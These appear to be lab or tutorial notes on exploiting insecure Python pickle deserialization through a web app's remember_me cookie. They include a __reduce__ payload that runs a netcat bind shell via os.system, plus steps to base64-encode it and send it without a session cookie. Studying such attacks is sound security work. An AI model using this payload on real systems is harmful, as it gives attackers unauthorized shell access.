pickle code execution (serialization)

import cPickle
class Hack:
  def __init__(self):
    self.test1 = "test"  
    self.test2 = "retest"  

h = Hack()
print cPickle.dumps(h)

the output is multi-lines and contains a fair-bit of special characters (it's unlikely that web applications use it as it is)
most web applications dealing with pickle objects will encode them (for example using base64)


class Blah(object):
  def __reduce__(self):
    return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))

we can use the code from the previous section to get the pickled object. now, we need to find where the application uses pickled data. By inspecting the application, we can see that the application uses pickle as part of the remember_me function.

we can now try to send our malicious object in the remember_me cookie. 
after base64 encoding the payload, we can then send it to the application to obtain command execution. if we do this, we can see that it doesn't work.

by tacking a step back and thinking like the person who developed the application, we can make a guess: the remember_me cookie will only be processed if we do not provide a session. once you send your payload without a session, you should be able to connect to the shell using nc or telnet.


remember me vs. session

if [rememberme=on]:
	Set-Cookie: rememberme=KGxwMQpWYWRtaW4KcDIKYVMnY2UzYmVkMzY4NzU0YWUxMjY1MTg5YWVhNjliMTRjZTUnCnAzCmEu; Path=/
	Set-Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0.EFTHBw.n2Z18cPCB3qmzkj1av7Koy2Sgi8; HttpOnly; Path=/

else only session is set



